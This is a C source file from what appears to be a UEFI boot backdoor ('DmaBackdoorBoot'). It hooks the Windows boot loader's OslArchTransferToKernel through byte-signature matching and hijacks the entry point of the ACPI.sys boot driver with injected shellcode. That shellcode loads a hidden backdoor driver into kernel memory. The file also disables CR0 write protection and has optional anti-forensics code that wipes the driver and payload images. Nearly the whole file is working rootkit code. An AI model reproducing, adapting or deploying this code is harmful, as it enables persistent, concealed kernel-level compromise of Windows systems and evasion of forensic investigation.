#include <PiPei.h>

#include <IndustryStandard/PeImage.h>

#include "../config.h"

#include "common.h"
#include "debug.h"
#include "peimage.h"
#include "std.h"
#include "DmaBackdoorBoot.h"
#include "Winload.h"

#pragma warning(disable: 4054)
#pragma warning(disable: 4055)

#ifdef BACKDOOR_DEBUG

// debug image
#include "backdoor\driver_debug_sys.h"

#else

// release image
#include "backdoor\driver_sys.h"

#endif

#define MAX_MODULE_NAME_LEN 0x100

// max size of winload!OslArchTransferToKernel() call gate
#define WINLOAD_SAVED_LEN 0x20

typedef VOID (EFIAPI * func_OslArchTransferToKernel)(PLOADER_PARAMETER_BLOCK LoaderBlock, VOID *Entry);

// defined in DmaBackdoorBoot.c
extern EFI_BOOT_SERVICES *m_BS;
extern BACKDOOR_INFO m_BackdoorInfo;
extern VOID *m_Payload;
extern UINT32 m_PayloadSize;

func_OslArchTransferToKernel old_OslArchTransferToKernel = NULL;

BOOLEAN m_bShellcodeReady = FALSE;

// saved bytes from winload!OslArchTransferToKernel()
UINT8 m_WinloadSavedBytes[WINLOAD_SAVED_LEN];

// driver image address
VOID *m_DriverAddr = NULL;
UINT32 m_DriverSize = 0;
//--------------------------------------------------------------------------------------
#pragma pack(push, 1)

typedef struct _SHELLCODE_CONTEXT
{
    UINT8 call_next_op;
    UINT32 call_next_offset;
    UINT8 pop_rax;
    UINT32 sub_rax;

    // save registers  
    UINT8 push_rdx;  
    UINT8 push_rcx;    
    UINT16 push_r8;
    UINT16 push_r9;

    // mov rcx, rax
    UINT32 mov_rcx;

    // sub rsp, 0x40
    UINT32 sub_rsp;

    // call Shellcode
    UINT8 call_sc_op;
    UINT32 call_sc_offset;

    // add rsp, 0x40
    UINT32 add_rsp;

    // restore registers
    UINT16 pop_r9;
    UINT16 pop_r8;    
    UINT8 pop_rcx;
    UINT8 pop_rdx;    

    // jmp rax
    UINT16 jmp_rax;    

    VOID *DriverAddr;
    UINT32 DriverSize;
    
    PLDR_DATA_TABLE_ENTRY LoaderEntry;
    UINT32 EntryPoint;
    UINT32 SectionOffset;
    
    VOID *KernelBase;   
    func_ExAllocatePool f_ExAllocatePool; 
    func_MmUnmapIoSpace f_MmUnmapIoSpace;
    func_MmMapIoSpace f_MmMapIoSpace;    

    UINT8 Shellcode[];

} SHELLCODE_CONTEXT,
*PSHELLCODE_CONTEXT;

#pragma pack(pop)

typedef UINT32 (EFIAPI * DRIVER_ENTRY)(VOID *Unused, PBACKDOOR_DRIVER Context);

#define CR0_WP 0x000010000

VOID *Shellcode(PSHELLCODE_CONTEXT Context)
{    
    UINT32 i = 0;
    VOID *ImageBase = Context->LoaderEntry->DllBase;
    VOID *EntryPoint = RVATOVA(ImageBase, Context->EntryPoint);

    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        ImageBase, ((EFI_IMAGE_DOS_HEADER *)ImageBase)->e_lfanew);  

    EFI_IMAGE_SECTION_HEADER *pSection = (EFI_IMAGE_SECTION_HEADER *)RVATOVA(
        ImageBase, Context->SectionOffset);
    
    // map physical memory with driver image
    UINT8 *Mem = (UINT8 *)Context->f_MmMapIoSpace(Context->DriverAddr, Context->DriverSize, 0);
    if (Mem)
    {
        // sanity check
        if (*(UINT16 *)Mem == EFI_IMAGE_DOS_SIGNATURE)
        {
            // allocate executable kernel memory for driver image
            UINT8 *Driver = (UINT8 *)Context->f_ExAllocatePool(0, Context->DriverSize);
            if (Driver)
            {
                EFI_IMAGE_NT_HEADERS *pHeadersDriver = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
                    Mem, ((EFI_IMAGE_DOS_HEADER *)Mem)->e_lfanew);    

                DRIVER_ENTRY DriverEntry = (DRIVER_ENTRY)RVATOVA(
                    Driver, pHeadersDriver->OptionalHeader.AddressOfEntryPoint);

                BACKDOOR_DRIVER DriverContext;

                DriverContext.ImageBase = Driver;
                DriverContext.TargetBase = ImageBase;
                DriverContext.KernelBase = Context->KernelBase;
                DriverContext.Flags = 0;

                // copy driver image
                for (i = 0; i < Context->DriverSize; i += 1)
                {
                    *(Driver + i) = *(Mem + i);

#ifdef USE_ANTI_FORENSICS

                    // wipe old driver image
                    *(Mem + i) = 0;
#endif
                }                

                // call driver entry point
                DriverEntry(NULL, &DriverContext);
            }
        }

        // unmap physical memory
        Context->f_MmUnmapIoSpace(Mem, Context->DriverSize);
    }

    // disable write protection
    __writecr0(__readcr0() & ~CR0_WP);

    // remove executable flag
    pSection->Characteristics &= ~EFI_IMAGE_SCN_MEM_EXECUTE;

    // restore entry point in image headers
    pHeaders->OptionalHeader.AddressOfEntryPoint = Context->EntryPoint;

    // restore write protection
    __writecr0(__readcr0() | CR0_WP);
        
    // restore entry point in loader block
    Context->LoaderEntry->EntryPoint = EntryPoint;    

    return EntryPoint;
}

UINT32 ShellcodeEnd(VOID)
{
    return 0;
}
//--------------------------------------------------------------------------------------
BOOLEAN ShellcodePrepare(VOID *KernelBase, PLDR_DATA_TABLE_ENTRY LoaderEntry)
{
    PSHELLCODE_CONTEXT Context = NULL;
    UINT32 ShellcodeSize = (UINT32)((UINTN)&ShellcodeEnd - (UINTN)&Shellcode), i = 0;    
    VOID *ImageBase = LoaderEntry->DllBase;

    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        ImageBase, ((EFI_IMAGE_DOS_HEADER *)ImageBase)->e_lfanew);    

    EFI_IMAGE_SECTION_HEADER *pSection = (EFI_IMAGE_SECTION_HEADER *)RVATOVA(
        &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);    

    func_ExAllocatePool f_ExAllocatePool = NULL;
    func_MmUnmapIoSpace f_MmUnmapIoSpace = NULL;
    func_MmMapIoSpace f_MmMapIoSpace = NULL;
 
    // get address of nt!ExAllocatePool()
    f_ExAllocatePool = (func_ExAllocatePool)LdrGetProcAddress(KernelBase, "ExAllocatePool");

    // get address of nt!MmUnmapIoSpace()
    f_MmUnmapIoSpace = (func_MmUnmapIoSpace)LdrGetProcAddress(KernelBase, "MmUnmapIoSpace");

    // get address of nt!MmMapIoSpace()
    f_MmMapIoSpace = (func_MmMapIoSpace)LdrGetProcAddress(KernelBase, "MmMapIoSpace");

    if (f_ExAllocatePool == NULL || f_MmUnmapIoSpace == NULL || f_MmMapIoSpace == NULL)
    {
        return FALSE;
    }

    // find resources section
    for (i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
    {
        char *p = (char *)&pSection->Name;

        // match section name
        if (p[0] == '.' && p[1] == 'r' && p[2] == 's' && p[3] == 'r' && p[4] == 'c')
        {
            if (pSection->Misc.VirtualSize >= ShellcodeSize + sizeof(SHELLCODE_CONTEXT))
            {
                Context = (PSHELLCODE_CONTEXT)RVATOVA(ImageBase, pSection->VirtualAddress);

                // calculate section RVA
                Context->SectionOffset = (UINT32)((UINTN)pSection - (UINTN)ImageBase);

                // make section executable
                pSection->Characteristics |= EFI_IMAGE_SCN_MEM_EXECUTE;
            }

            break;
        }

        pSection += 1;
    }

    if (Context == NULL)
    {
        return FALSE;
    }

    // call $+5
    Context->call_next_op = 0xe8;
    Context->call_sc_offset = 0;

    // pop rax
    Context->pop_rax = 0x58;    

    // sub rax, 5
    Context->sub_rax = 0x05e88348;

    // push {rdx, rcx, r8, r9}
    Context->push_rdx = 0x52;
    Context->push_rcx = 0x51;    
    Context->push_r8 = 0x5041;
    Context->push_r9 = 0x5141;

    // mov rcx, rax
    Context->mov_rcx = 0x90c18948;

    // sub rsp, 0x48
    Context->sub_rsp = 0x48ec8348;

    // call Shellcode
    Context->call_sc_op = 0xe8;
    Context->call_sc_offset = 
        OFFSET_OF(SHELLCODE_CONTEXT, Shellcode) - 
        OFFSET_OF(SHELLCODE_CONTEXT, call_sc_op) - JUMP32_LEN;    

    // add rsp, 0x48
    Context->add_rsp = 0x48c48348;

    // pop {r9, r8, rcx, rdx}
    Context->pop_r9 = 0x5941;
    Context->pop_r8 = 0x5841;    
    Context->pop_rcx = 0x59;
    Context->pop_rdx = 0x5a;

    // jmp rax
    Context->jmp_rax = 0xe0ff;
    
    Context->DriverAddr = m_DriverAddr;
    Context->DriverSize = m_DriverSize;
    Context->LoaderEntry = LoaderEntry;
    Context->EntryPoint = pHeaders->OptionalHeader.AddressOfEntryPoint;
    Context->KernelBase = KernelBase;
    Context->f_ExAllocatePool = f_ExAllocatePool;
    Context->f_MmUnmapIoSpace = f_MmUnmapIoSpace;
    Context->f_MmMapIoSpace = f_MmMapIoSpace;

    // copy shellcode
    std_memcpy(Context->Shellcode, (VOID *)&Shellcode, ShellcodeSize);

    // update module entry point to execute shellcode
    LoaderEntry->EntryPoint = Context;
    pHeaders->OptionalHeader.AddressOfEntryPoint = pSection->VirtualAddress;

    return TRUE;
}
//--------------------------------------------------------------------------------------
BOOLEAN FindLoaderEntry(PLDR_DATA_TABLE_ENTRY LoaderEntry)
{
    VOID *TargetImageBase = LoaderEntry->DllBase;

    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        TargetImageBase, ((EFI_IMAGE_DOS_HEADER *)TargetImageBase)->e_lfanew);

    if (pHeaders->OptionalHeader.AddressOfEntryPoint &&
        LoaderEntry->BaseDllName.Length > 0 && LoaderEntry->BaseDllName.Buffer &&
        LoaderEntry->BaseDllName.Length / sizeof(UINT16) < MAX_MODULE_NAME_LEN - 1) 
    {
        UINT16 BaseDllName[MAX_MODULE_NAME_LEN], *p = BaseDllName;   
        UINT16 i = 0;

        // copy boot driver file name into the buffer
        for (; i < LoaderEntry->BaseDllName.Length / sizeof(UINT16); i += 1)
        {
            UINT16 *chr = BaseDllName + i;
            *chr = LoaderEntry->BaseDllName.Buffer[i];

            if ((*chr >= 'A') && (*chr <= 'Z')) 
            {
                // convert character to lower case
                *chr += ('a' - 'A');
            }
        }
        
        BaseDllName[i] = '\0';

        // match ACPI.sys boot driver file name
        if (p[0] == 'a' && p[1] == 'c' && p[2] == 'p' && p[3] == 'i' && p[4] == '.')
        {
            return TRUE;
        }
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
VOID new_OslArchTransferToKernel(PLOADER_PARAMETER_BLOCK LoaderBlock, VOID *Entry)
{
    LIST_ENTRY *NextEntry = LoaderBlock->LoadOrderListHead.ForwardLink;
    PLDR_DATA_TABLE_ENTRY TargetEntry = NULL;
    UINT32 ImageCount = 0;    

    // 2-nd argument points to the kernel image
    VOID *KernelBase = (VOID *)ALIGN_DOWN((UINTN)Entry, PAGE_SIZE);

    if (m_bShellcodeReady)
    {
        goto _end;
    }

    // get kernel module base by address inside of it
    while (*(UINT16 *)KernelBase != EFI_IMAGE_DOS_SIGNATURE)
    {
        KernelBase = (VOID *)((UINT8 *)KernelBase - PAGE_SIZE);
    }

    // walk trough the boot drivers list    
    while (NextEntry != &LoaderBlock->LoadOrderListHead) 
    {
        PLDR_DATA_TABLE_ENTRY LoaderEntry = CONTAINING_RECORD(
            NextEntry,
            LDR_DATA_TABLE_ENTRY,
            InLoadOrderModuleList
        );

        // skip first N images in the list (NT, HAL, KDCOM, etc.) and the images without entry 
        if (ImageCount >= 2) 
        {
            if (FindLoaderEntry(LoaderEntry))
            {
                // found
                TargetEntry = LoaderEntry;
                break;
            }
        }

        ImageCount += 1;
        NextEntry = NextEntry->ForwardLink;
    }

    if (TargetEntry)
    {
        // set up driver load shellcode
        m_bShellcodeReady = ShellcodePrepare(KernelBase, TargetEntry);
    }

_end:

    // call original funtion
    old_OslArchTransferToKernel(LoaderBlock, Entry);
}
//--------------------------------------------------------------------------------------
BOOLEAN WinloadHook(VOID *WinloadBase)
{
    UINT32 i = 0, CodeAddr = 0, CodeSize = 0;    
    UINT8 *HvlpBelow1MbPageAllocated = NULL;
    VOID **HvlpBelow1MbPage = NULL;        

    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        WinloadBase, ((EFI_IMAGE_DOS_HEADER *)WinloadBase)->e_lfanew);

    EFI_IMAGE_SECTION_HEADER *pSection = (EFI_IMAGE_SECTION_HEADER *)RVATOVA(
        &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);    

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): winload image is at "FPTR"\r\n", WinloadBase);

    // find code section by name
    for (i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1, pSection += 1)
    {
        if (std_strcmp((char *)&pSection->Name, ".text") == 0)
        {
            CodeAddr = pSection->VirtualAddress;
            CodeSize = pSection->Misc.VirtualSize;
            break;
        }
    }

    if (CodeAddr == 0 || CodeSize <= PAGE_SIZE)
    {
        return FALSE;
    }

    // update status
    m_BackdoorInfo.Status = BACKDOOR_ERR_WINLOAD_SIGN_1;

    for (i = 0; i < CodeSize - PAGE_SIZE; i += 1) 
    {
        UINT8 *Buff = RVATOVA(WinloadBase, CodeAddr + i);        

        /*
            Match winload!OslpBuildKernelMemoryMap() code signature:

                cmp     cs:HvlpBelow1MbPageAllocated, bl
                jnz     loc_140006220
                mov     rax, [rsi+10h]
                mov     rdx, cs:HvlpBelow1MbPage
                shl     rax, 0Ch
                cmp     rax, rdx
                ja      loc_140006220            
        */
        if ((*(UINT32 *)(Buff + 0x0c) == 0x10468b48 &&
             *(UINT32 *)(Buff + 0x17) == 0x0ce0c148 &&
             *(Buff + 0x00) == 0x38 && *(Buff + 0x01) == 0x1d &&
             *(Buff + 0x10) == 0x48 && *(Buff + 0x11) == 0x8b && *(Buff + 0x12) == 0x15 &&
             *(Buff + 0x1b) == 0x48 && *(Buff + 0x1c) == 0x3b && *(Buff + 0x1d) == 0xc2) ||

        /*
            ... its variation with r8 instead of rdx from Windows 8.1:

                cmp     cs:HvlpBelow1MbPageAllocated, bl
                jnz     loc_14000A7D2
                mov     rax, [rsi+10h]
                mov     r8, cs:HvlpBelow1MbPage
                shl     rax, 0Ch
                cmp     rax, r8
                ja      short loc_14000A7D2
        */
            (*(UINT32 *)(Buff + 0x0c) == 0x10468b48 &&
             *(UINT32 *)(Buff + 0x17) == 0x0ce0c148 &&
             *(Buff + 0x00) == 0x38 && *(Buff + 0x01) == 0x1d &&
             *(Buff + 0x10) == 0x4c && *(Buff + 0x11) == 0x8b && *(Buff + 0x12) == 0x05 &&
             *(Buff + 0x1b) == 0x49 && *(Buff + 0x1c) == 0x3b && *(Buff + 0x1d) == 0xc0))
        {
            // get mov and cmp instructions operands
            HvlpBelow1MbPage = (VOID **)(Buff + 0x17 + *(INT32 *)(Buff + 0x13));
            HvlpBelow1MbPageAllocated = (Buff + 0x06 + *(INT32 *)(Buff + 0x02));
        }

        /*
            ... its variation from Windows 10 2004:

                cmp     cs:byte_1801A586A, dil
                jnz     loc_180023242
                mov     rax, [r14+10h]
                mov     rdx, cs:qword_1801A5970
                shl     rax, 0Ch
                cmp     rax, rdx
                ja      loc_180023242
        */
        else if (*(UINT32 *)(Buff + 0x0d) == 0x10468b49 &&
                 *(UINT32 *)(Buff + 0x18) == 0x0ce0c148 &&
                 *(Buff + 0x00) == 0x40 && *(Buff + 0x01) == 0x38 && *(Buff + 0x02) == 0x3d &&
                 *(Buff + 0x11) == 0x48 && *(Buff + 0x12) == 0x8b && *(Buff + 0x13) == 0x15 &&
                 *(Buff + 0x1c) == 0x48 && *(Buff + 0x1d) == 0x3b && *(Buff + 0x1e) == 0xc2)
        {
            // get mov and cmp instructions operands
            HvlpBelow1MbPage = (VOID **)(Buff + 0x18 + *(INT32 *)(Buff + 0x14));
            HvlpBelow1MbPageAllocated = (Buff + 0x07 + *(INT32 *)(Buff + 0x03));
        }

        if (HvlpBelow1MbPage && HvlpBelow1MbPageAllocated)
        {
            DbgMsg(__FILE__, __LINE__, "winload!HvlpBelow1MbPage is at "FPTR"\n", HvlpBelow1MbPage);
            DbgMsg(__FILE__, __LINE__, "winload!HvlpBelow1MbPageAllocated is at "FPTR"\n", HvlpBelow1MbPageAllocated);

            // check if Hyper-V is going to be loaded
            if (*HvlpBelow1MbPageAllocated != 0)
            {
                m_BackdoorInfo.Status = BACKDOOR_ERR_WINLOAD_HV;
                return FALSE;
            }

            break;
        }
    }     

    if (HvlpBelow1MbPage == NULL || HvlpBelow1MbPageAllocated == NULL)
    {
        return FALSE;
    }

    // update status
    m_BackdoorInfo.Status = BACKDOOR_ERR_WINLOAD_SIGN_2;

    for (i = 0; i < CodeSize - PAGE_SIZE; i += 1) 
    {
        UINT8 *Buff = RVATOVA(WinloadBase, CodeAddr + i), *Func = NULL;
        UINTN Size = 0;

        /*
            Match winload!OslArchTransferToKernel() code signature.

            Windows 7, 8 and 8.1 variant:

                xor     esi, esi
                mov     r12, rcx
                mov     r13, rdx
                sub     rax, rax
                mov     ss, ax
                mov     rsp, cs:OslArchKernelStack
                lea     rax, OslArchKernelGdt
                lea     rcx, OslArchKernelIdt
                lgdt    fword ptr [rax]
                lidt    fword ptr [rcx]            
        */
        if ((*(Buff + 0x00) == 0x33 && *(Buff + 0x01) == 0xf6 &&
             *(Buff + 0x15) == 0x48 && *(Buff + 0x16) == 0x8d && *(Buff + 0x17) == 0x05 &&
             *(Buff + 0x1c) == 0x48 && *(Buff + 0x1d) == 0x8d && *(Buff + 0x1e) == 0x0d &&
             *(Buff + 0x23) == 0x0f && *(Buff + 0x24) == 0x01 && *(Buff + 0x25) == 0x10 &&
             *(Buff + 0x26) == 0x0f && *(Buff + 0x27) == 0x01 && *(Buff + 0x28) == 0x19))
        {
            Func = Buff;
            Size = 14;
        }

        /*
            Windows 10 variant with wbinvd:

                xor     esi, esi
                mov     r12, rcx
                mov     r13, rdx
                wbinvd
                sub     rax, rax
                mov     ss, ax
                mov     rsp, cs:OslArchKernelStack
                lea     rax, OslArchKernelGdt
                lea     rcx, OslArchKernelIdt
                lgdt    fword ptr [rax]
                lidt    fword ptr [rcx]
        */
        else if ((*(Buff + 0x00) == 0x33 && *(Buff + 0x01) == 0xf6 &&
                  *(Buff + 0x17) == 0x48 && *(Buff + 0x18) == 0x8d && *(Buff + 0x19) == 0x05 &&
                  *(Buff + 0x1e) == 0x48 && *(Buff + 0x1f) == 0x8d && *(Buff + 0x20) == 0x0d &&
                  *(Buff + 0x25) == 0x0f && *(Buff + 0x26) == 0x01 && *(Buff + 0x27) == 0x10 &&
                  *(Buff + 0x28) == 0x0f && *(Buff + 0x29) == 0x01 && *(Buff + 0x2a) == 0x19))
        {
            Func = Buff;
            Size = 16;            
        }

        if (Func != NULL)
        {
            DbgMsg(__FILE__, __LINE__, "winload!OslArchTransferToKernel() is at "FPTR"\n", Func);

            /*
                Set up hook on winload!OslArchTransferToKernel()
            */
            
            // save original bytes
            std_memcpy(m_WinloadSavedBytes, Func, Size);

            // jmp qword [addr] - from function to the handler
            *(UINT16 *)(Func) = 0x25ff;
            *(UINT32 *)(Func + 2) = 0;

            // addr dq XXXXXXXXXXXXXXXXh
            *(UINT64 *)(Func + 6) = (UINT64)&new_OslArchTransferToKernel;
            
            // jmp qword [addr] - from call gate to the function
            *(UINT16 *)(m_WinloadSavedBytes + Size) = 0x25ff;
            *(UINT32 *)(m_WinloadSavedBytes + Size + 2) = 0;

            // addr dq XXXXXXXXXXXXXXXXh
            *(UINT64 *)(m_WinloadSavedBytes + Size + 6) = (UINT64)(Func + Size);

            old_OslArchTransferToKernel = (func_OslArchTransferToKernel)(m_WinloadSavedBytes);

            // update status
            m_BackdoorInfo.Status = BACKDOOR_SUCCESS;
            m_BackdoorInfo.ImageBase = WinloadBase;
            m_BackdoorInfo.ImageFunc = Func;

            return TRUE;
        }
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
BOOLEAN WinloadInitialize(void)
{
    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        driver, ((EFI_IMAGE_DOS_HEADER *)driver)->e_lfanew);

    EFI_IMAGE_SECTION_HEADER *pSection = (EFI_IMAGE_SECTION_HEADER *)RVATOVA(
        &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

    UINT32 ImageSize = pHeaders->OptionalHeader.SizeOfImage;
    UINT32 DriverSize = ImageSize + m_PayloadSize, i = 0;

    EFI_PHYSICAL_ADDRESS Addr = 0;
    UINTN PagesCount = (DriverSize / PAGE_SIZE) + 1;    

    // allocate memory for driver image
    EFI_STATUS Status = m_BS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        PagesCount,
        &Addr
    );
    if (Status == EFI_SUCCESS)
    { 
        VOID *DriverAddr = (VOID *)Addr;

        // copy driver headers
        std_memcpy(DriverAddr, driver, pHeaders->OptionalHeader.SizeOfHeaders);

        // copy driver sections        
        for (i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
        {            
            std_memcpy(
                RVATOVA(DriverAddr, pSection->VirtualAddress), 
                RVATOVA(driver, pSection->PointerToRawData),
                min(pSection->SizeOfRawData, pSection->Misc.VirtualSize)
            );

            pSection += 1;
        }    

        if (m_Payload)
        {
            std_memcpy(RVATOVA(DriverAddr, ImageSize), m_Payload, m_PayloadSize);

            // save payload address and size
            BACKDOOR_PAYLOAD_INFO(DriverAddr)->Offset = ImageSize;
            BACKDOOR_PAYLOAD_INFO(DriverAddr)->Size = m_PayloadSize;
        }
        else
        {
            BACKDOOR_PAYLOAD_INFO(DriverAddr)->Offset = 0;
            BACKDOOR_PAYLOAD_INFO(DriverAddr)->Size = 0;
        }

#ifdef USE_ANTI_FORENSICS

        // erase driver image
        std_memset(driver, 0, sizeof(driver));

        if (m_Payload)
        {
            // erase old payload image
            std_memset(m_Payload, 0, m_PayloadSize);

            m_Payload = NULL;
            m_PayloadSize = 0;
        }

#endif

        m_DriverAddr = DriverAddr;
        m_DriverSize = DriverSize;

        return TRUE;
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
// EoF
